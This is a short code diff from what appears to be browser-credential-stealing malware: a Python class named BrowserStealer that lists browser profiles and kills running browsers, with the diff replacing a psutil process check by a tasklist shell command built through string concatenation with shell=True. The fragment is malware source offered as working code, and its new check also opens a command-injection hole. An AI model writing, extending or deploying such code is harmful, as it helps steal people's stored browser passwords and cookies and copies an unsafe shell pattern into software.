@@ -4,7 +4,6 @@ import sqlite3
 import shutil
 import threading
 import subprocess
-import psutil
 from . import utils
 
 BROWSER_PATHS = [
@@ -82,13 +81,11 @@ class BrowserStealer:
         return profiles
 
     def is_process_running(self, exe_name):
-        for proc in psutil.process_iter(['name']):
-            try:
-                if proc.info['name'] and proc.info['name'].lower() == exe_name.lower():
-                    return True
-            except:
-                pass
-        return False
+        try:
+            output = subprocess.check_output('tasklist /fi "IMAGENAME eq ' + exe_name + '" /nh', shell=True, stderr=subprocess.DEVNULL).decode(errors='ignore')
+            return exe_name.lower() in output.lower()
+        except:
+            return False
 
     def kill_browser_process(self, exe_name):
         if self.is_process_running(exe_name):
